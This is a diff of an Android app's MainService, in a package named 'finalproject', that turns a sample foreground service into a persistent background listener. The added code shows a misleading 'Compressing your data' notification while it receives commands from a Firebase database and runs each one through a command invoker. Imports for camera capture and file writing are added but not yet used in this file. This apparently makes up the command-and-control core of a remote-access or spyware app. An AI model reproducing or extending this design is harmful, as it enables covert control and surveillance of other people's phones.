@@ -1,95 +1,120 @@
 package com.aei.finalproject;
 
+import android.Manifest;
 import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
+import android.content.pm.PackageManager;
+import android.graphics.ImageFormat;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CameraMetadata;
+import android.hardware.camera2.CaptureRequest;
+import android.hardware.camera2.TotalCaptureResult;
+import android.media.Image;
+import android.media.ImageReader;
+import android.os.Build;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
 import android.util.Log;
+import android.util.Size;
+import android.util.SparseIntArray;
+import android.view.Surface;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 
+import com.aei.managment.CommandInvoker;
+import com.aei.network.DatabaseConnector;
+import com.aei.utils.MySharedPrefs;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.nio.ByteBuffer;
+import java.util.ArrayList;
+import java.util.LinkedList;
+import java.util.List;
+
 public class MainService extends Service {
-    private static final String TAG_FOREGROUND_SERVICE = "FOREGROUND_SERVICE";
-
-    public static final String ACTION_START_FOREGROUND_SERVICE = "ACTION_START_FOREGROUND_SERVICE";
-
-    public static final String ACTION_STOP_FOREGROUND_SERVICE = "ACTION_STOP_FOREGROUND_SERVICE";
-
-    public MainService() {
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        // TODO: Return the communication channel to the service.
-        throw new UnsupportedOperationException("Not yet implemented");
-    }
+    public static final String CHANNEL_ID = "MainServiceChannel";
+    private DatabaseConnector databaseConnector;
+    private CommandInvoker commandInvoker;
+    private MySharedPrefs mySharedPrefs;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG_FOREGROUND_SERVICE, "My foreground service onCreate().");
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if(intent != null)
-        {
-            String action = intent.getAction();
-            if (action != null) {
-                switch (action){
-                    case ACTION_START_FOREGROUND_SERVICE:
-                        startForegroundService();
-                        Toast.makeText(getApplicationContext(), "Foreground service is started.", Toast.LENGTH_LONG).show();
-                        break;
-                    case ACTION_STOP_FOREGROUND_SERVICE:
-                        stopForegroundService();
-                        Toast.makeText(getApplicationContext(), "Foreground service is stopped.", Toast.LENGTH_LONG).show();
-                        break;
-                }
-            }
-        }
-        return super.onStartCommand(intent, flags, startId);
-    }
+        mySharedPrefs = new MySharedPrefs(getApplicationContext());
 
-    /* Used to build and start foreground service. */
-    private void startForegroundService()
-    {
-        Log.d(TAG_FOREGROUND_SERVICE, "Start foreground service.");
-
-        // Create notification builder.
-        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
-
-        // Make notification show big text.
-        NotificationCompat.BigTextStyle bigTextStyle = new NotificationCompat.BigTextStyle();
-        bigTextStyle.setBigContentTitle("Music player implemented by foreground service.");
-        bigTextStyle.bigText("Android foreground service is a android service which can run in foreground always, it can be controlled by user via notification.");
-        // Set big text style.
-        builder.setStyle(bigTextStyle);
-
-        builder.setWhen(System.currentTimeMillis());
-        builder.setSmallIcon(R.mipmap.ic_launcher);
-        // Make the notification max priority.
-        builder.setPriority(Notification.PRIORITY_MAX);
-
-        // Build the notification.
-        Notification notification = builder.build();
-
-        // Start foreground service.
+        databaseConnector = new DatabaseConnector(getApplicationContext());
+        commandInvoker = new CommandInvoker(getApplication());
+        createNotificationChannel();
+        Intent notificationIntent = new Intent(this, MainActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(this,
+                0, notificationIntent, 0);
+        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle(getApplicationContext().getResources().getString(R.string.app_name))
+                .setContentText("Compressing your data")
+                .setSmallIcon(R.mipmap.ic_launcher_round)
+                .setContentIntent(pendingIntent)
+                .build();
         startForeground(1, notification);
+        if (mySharedPrefs.getString("ID", "").isEmpty()) {
+            stopSelf();
+            return START_NOT_STICKY;
+        }
+        databaseConnector.addOnCommandReceivedCallback((command -> {
+            try {
+                commandInvoker.invoke(command, databaseConnector);
+            } catch (Exception e) {
+                e.printStackTrace(System.err);
+            }
+        }));
+        return START_STICKY;
     }
 
-    private void stopForegroundService()
-    {
-        Log.d(TAG_FOREGROUND_SERVICE, "Stop foreground service.");
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.e("Main Service", "Destroying!");
+    }
 
-        // Stop foreground service and remove the notification.
-        stopForeground(true);
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
-        // Stop the foreground service.
-        stopSelf();
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel serviceChannel = new NotificationChannel(
+                    CHANNEL_ID,
+                    "Foreground Service Channel",
+                    NotificationManager.IMPORTANCE_DEFAULT
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(serviceChannel);
+        }
     }
 }
